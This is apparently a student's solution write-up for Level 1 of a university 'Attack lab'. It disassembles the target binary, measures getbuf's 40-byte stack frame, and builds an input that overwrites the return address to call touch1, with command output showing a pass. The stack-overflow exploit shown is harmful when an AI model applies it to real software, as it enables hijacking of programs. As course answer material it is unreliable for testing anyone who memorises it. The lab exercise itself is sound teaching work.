# Attack lab

By Adrian Borup (adbo@itu.dk).

## Part I: Code Injection Attacks

### Level 1

We start by inspecting the assembly to find the address of the `touch1` function:

```asm
$ objdump -D ctarget | grep -A 14 "<touch1>"
0000000000402698 <touch1>:
  402698:       f3 0f 1e fa             endbr64
  40269c:       50                      push   %rax
  40269d:       58                      pop    %rax
  40269e:       48 83 ec 08             sub    $0x8,%rsp
  4026a2:       c7 05 50 82 0f 00 01    movl   $0x1,0xf8250(%rip)        # 4fa8fc <vlevel>
  4026a9:       00 00 00
  4026ac:       48 8d 3d 58 5c 0c 00    lea    0xc5c58(%rip),%rdi        # 4c830b <_IO_stdin_used+0x30b>
  4026b3:       e8 a8 a2 01 00          callq  41c960 <_IO_puts>
  4026b8:       bf 01 00 00 00          mov    $0x1,%edi
  4026bd:       e8 f4 04 00 00          callq  402bb6 <validate>
  4026c2:       bf 00 00 00 00          mov    $0x0,%edi
  4026c7:       e8 64 fb 00 00          callq  412230 <exit>

00000000004026cc <touch2>:
```

Our goal is now to overwrite the return address after `getbuf` so it points to `0x402698`. We want to know the size of the stack frame so we can overwrite the return address. Let's check out `getbuf`'s assembly code:

```asm
$ objdump -D ctarget | grep -A 9 -m 1 "<getbuf>"
000000000040267e <getbuf>:
  40267e:       f3 0f 1e fa             endbr64
  402682:       48 83 ec 28             sub    $0x28,%rsp
  402686:       48 89 e7                mov    %rsp,%rdi
  402689:       e8 b5 02 00 00          callq  402943 <Gets>
  40268e:       b8 01 00 00 00          mov    $0x1,%eax
  402693:       48 83 c4 28             add    $0x28,%rsp
  402697:       c3                      retq

0000000000402698 <touch1>:
```

At instruction `0x40267e`, we can see an integer constant `$0x28`, which is 40 in base 10. The return address, `%rsp`, is decremented with these 40 bytes - therefore our stack frame must be 40 bytes in size. We can confirm this by seeing if the program starts to misbehave between 39 and 40 bytes of input:

```sh
# File contains 39 bytes:
$ cat inp.txt
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00

# Pipe 39 bytes into the program:
$ cat inp.txt | ./hex2raw | ./ctarget
Cookie: 0x5d21660e
Type string:No exploit.  Getbuf returned 0x1
Normal return

# Pipe one more byte into the program:
$ (cat inp.txt; echo " 00") | ./hex2raw | ./ctarget
Cookie: 0x5d21660e
Type string:Ouch!: You caused a segmentation fault!
Better luck next time
FAILED
```

Yup! Boom. The segfault happens when we feed 40 bytes. Therefore, let's try to add another word (8 bytes) to the input so those bytes will overwrite the return address:

```diff
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
+ 98 26 40 00 00 00 00 00
```

Here we've inserted the address of `touch1` (with the bytes reversed to obtain little-endian order). By feeding this to the vulnerable program, we see that the return address is indeed overwritten, and the instructions from `touch1` are executed:

```sh
$ ./hex2raw < inp.txt | ./ctarget
Cookie: 0x5d21660e
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```
